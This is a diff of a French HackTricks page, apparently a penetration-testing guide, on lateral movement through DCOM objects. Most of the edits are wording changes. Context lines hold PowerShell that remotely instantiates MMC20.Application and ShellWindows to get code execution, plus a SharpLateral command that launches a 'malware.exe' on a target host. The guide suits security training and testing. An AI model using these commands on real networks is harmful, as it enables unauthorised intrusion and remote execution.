@@ -4,21 +4,13 @@
 
 <summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>
 
-* Travaillez-vous dans une **entreprise de cybersécurité**? Vous voulez voir votre **entreprise annoncée dans HackTricks**? ou voulez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
+* Travaillez-vous dans une **entreprise de cybersécurité**? Voulez-vous voir votre **entreprise annoncée dans HackTricks**? ou voulez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
 * Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR aux** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud)..
 
 </details>
-
-<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-Trouvez les vulnérabilités les plus importantes afin de les corriger plus rapidement. Intruder suit votre surface d'attaque, lance des analyses de menaces proactives, trouve des problèmes dans l'ensemble de votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) aujourd'hui.
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
 
 ## MMC20.Application
 
@@ -29,7 +21,7 @@ Les objets du modèle d'objet de composant distribué (DCOM) offrent une capacit
 ```bash
 Get-CimInstance Win32_DCOMApplication
 ```
-L'objet COM, [Classe d'application MMC (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), permet le scriptage des opérations de la console MMC. Notamment, cet objet contient une méthode `ExecuteShellCommand` sous `Document.ActiveView`. Plus d'informations sur cette méthode peuvent être trouvées [ici](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Vérifiez son exécution :
+L'objet COM, [Classe d'application MMC (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), permet le scriptage des opérations de module enfichable MMC. Notamment, cet objet contient une méthode `ExecuteShellCommand` sous `Document.ActiveView`. Plus d'informations sur cette méthode peuvent être trouvées [ici](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Vérifiez en exécutant :
 
 Cette fonctionnalité facilite l'exécution de commandes sur un réseau via une application DCOM. Pour interagir avec DCOM à distance en tant qu'administrateur, PowerShell peut être utilisé comme suit :
 ```powershell
@@ -42,7 +34,7 @@ Vérifier les méthodes:
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
 $com.Document.ActiveView | Get-Member
 ```
-Obtenir un accès à distance (RCE) :
+Obtenir l'exécution de code à distance (RCE) :
 ```powershell
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
 $com | Get-Member
@@ -60,7 +52,7 @@ L'objet **MMC20.Application** a été identifié comme manquant de "LaunchPermis
 Deux objets spécifiques, `ShellBrowserWindow` et `ShellWindows`, ont été mis en avant en raison de leur absence de Launch Permissions explicites. L'absence d'une entrée de registre `LaunchPermission` sous `HKCR:\AppID\{guid}` signifie l'absence d'autorisations explicites.
 
 ###  ShellWindows
-Pour `ShellWindows`, qui ne possède pas de ProgID, les méthodes .NET `Type.GetTypeFromCLSID` et `Activator.CreateInstance` facilitent l'instanciation de l'objet en utilisant son AppID. Ce processus exploite OleView .NET pour récupérer le CLSID de `ShellWindows`. Une fois instanciée, l'interaction est possible via la méthode `WindowsShell.Item`, permettant l'invocation de méthodes telles que `Document.Application.ShellExecute`.
+Pour `ShellWindows`, qui ne possède pas de ProgID, les méthodes .NET `Type.GetTypeFromCLSID` et `Activator.CreateInstance` facilitent l'instanciation de l'objet en utilisant son AppID. Ce processus exploite OleView .NET pour récupérer le CLSID de `ShellWindows`. Une fois instancié, l'interaction est possible via la méthode `WindowsShell.Item`, permettant l'invocation de méthodes telles que `Document.Application.ShellExecute`.
 
 Des commandes PowerShell d'exemple ont été fournies pour instancier l'objet et exécuter des commandes à distance:
 ```powershell
@@ -109,7 +101,7 @@ SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 ## Outils Automatiques
 
 * Le script Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) permet d'invoquer facilement toutes les méthodes commentées pour exécuter du code sur d'autres machines.
-* Vous pourriez également utiliser [**SharpLateral**](https://github.com/mertdas/SharpLateral) :
+* Vous pourriez également utiliser [**SharpLateral**](https://github.com/mertdas/SharpLateral):
 ```bash
 SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 ```
@@ -118,17 +110,11 @@ SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 * [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
 * [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
 
-<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-Trouvez les vulnérabilités les plus importantes afin de les corriger plus rapidement. Intruder suit votre surface d'attaque, lance des analyses de menaces proactives, trouve des problèmes dans l'ensemble de votre pile technologique, des API aux applications web et aux systèmes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm_source=referral\&utm_campaign=hacktricks) aujourd'hui.
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
 <details>
 
-<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>
 
-Autres façons de soutenir HackTricks:
+Autres façons de soutenir HackTricks :
 
 * Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
